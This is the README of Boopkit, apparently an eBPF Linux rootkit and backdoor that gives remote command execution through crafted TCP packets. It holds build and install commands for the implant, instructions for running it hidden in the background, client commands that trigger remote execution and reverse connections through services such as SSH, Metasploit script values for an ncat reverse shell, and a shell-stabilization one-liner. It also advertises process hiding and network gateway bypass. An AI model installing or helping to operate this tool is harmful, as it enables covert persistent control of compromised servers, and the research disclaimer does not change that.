# Boopkit

Linux backdoor, rootkit, and eBPF bypass tools.
Remote command execution over raw TCP.

 - Tested on Linux kernel 5.16
 - Tested on Linux kernel 5.17
 - Remote code execution over TCP (SSH, Nginx, Kubernetes, etc)
 - Network gateway bypass (bad checksums, TCP reset)
 - Self obfuscation at runtime (eBPF process hiding)

##### Disclaimer

> This is **NOT** an exploit! This requires prior privileged access on a server in order to work!
> I am a professional security researcher. These are white hat tools used for research purposes only.
> Use this responsibly. Never use this software illegally.

## Server Side

Download and build boopkit.

```bash
wget https://github.com/kris-nova/boopkit/archive/refs/tags/v1.0.5.tar.gz
tar -xzf v1.0.5.tar.gz 
cd boopkit-1.0.5/
make
sudo make install
```

Run boopkit in the foreground. 

```bash 
# Reject all boops on localhost and 10.0.0.1
boopkit -x 127.0.0.1 -x 10.0.0.1
```

Run boopkit in the background without output

```bash 
# Danger! This can be VERY hard to stop! Run this at your own risk!
boopkit &> /dev/null &
```

Boopkit is now running and will automatically try to reverse connect to any source that is booping the server!

## Client Side

Download and build boopkit.

```bash
git clone https://github.com/kris-nova/boopkit.git
cd boopkit
make
sudo make install
```
Run boopkit-boop against the server.

```bash 
# ===================
RCE="ls -la"
# ===================
LHOST="127.0.0.1"
LPORT="3535"
RHOST="127.0.0.1"
RPORT="22"
boopkit-boop \
  -lhost $LHOST \
  -lport $LPORT \
  -rhost $RHOST \
  -rport $RPORT \
  -x "$RCE"
```

# DPI

  - Option 1: Fuck around with XDP/pcap
  - Option 2: Just use pcap

# Remote Vectors

Boopkit will respond to various events on the network. Both of which can be triggered with the `boopkit-boop` tool.

TCP Header Format. Taken from [RFC 793](https://datatracker.ietf.org/doc/html/rfc793#section-3.1). September 1981
```
        0                   1                   2                   3
        0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       |          Source Port          |       Destination Port        |
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       |                        Sequence Number                        |
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       |                    Acknowledgment Number                      |
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       |  Data |           |U|A|P|R|S|F|                               |
       | Offset| Reserved  |R|C|S|S|Y|I|            Window             |
       |       |           |G|K|H|T|N|N|                               |
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       |           Checksum            |         Urgent Pointer        |
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       |                    Options                    |    Padding    |
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       {                             data                              }
       {                             ....                              }
       {                             data                              }
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

### 1. Bad Checksum

First the `boopkit-boop` tool will send a malformed TCP SYN packet with an empty checksum to the server over a `SOCK_RAW` socket. This will trigger `boopkit` remotely regardless of what TCP services are running. In theory this would work against a server that has no TCP services listening!

### 2. Sending ACK-RST packet

Next the `boopkit-boop` tool will complete a valid TCP handshake with a `SOCK_STREAM` socket against a remote TCP service such as SSH, Kubernetes, Nginx, etc. After the initial TCP handshake is complete, `boopkit-boop` will repeat the process a 2nd time.
The 2nd handshake will flip the TCP reset flag in the packet, trigger a TCP reset on the server.

Either of these tactics are enough to independently trigger boopkit.
Various network hardware and runtime conditions will make either tactic more viable.
Boopkit will try both, by default.

# Boopscript

The `boopscript` file is a [Metasploit](https://github.com/rapid7/metasploit-framework) compatible script that can be used to remotely trigger the boopkit backdoor after `boopkit-boop` is installed locally.

```bash
# Remote values
RHOST="127.0.0.1"
RPORT="22"
# Local values
LHOST="127.0.0.1"
LPORT="3535"
# NetCat Reverse Shell Values
NCAT="/usr/bin/ncat"
NCATLISTENPORT="3545"
```

### Compile Time Dependencies 

 - 'clang'
 - `bpftool`
 - 'llvm'
 - 'lib32-glibc'

### Reverse Shell Stabilization

```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

### References

 - [Tracepoints with BPF](https://lwn.net/Articles/683504/)
 - [Raw TCP Sockets](https://github.com/MaxXor/raw-sockets-example)
 - [Bad BPF](https://github.com/pathtofile/bad-bpf)

Credit to the original authors for their helpful code samples! I forked a lot of code for this project! 
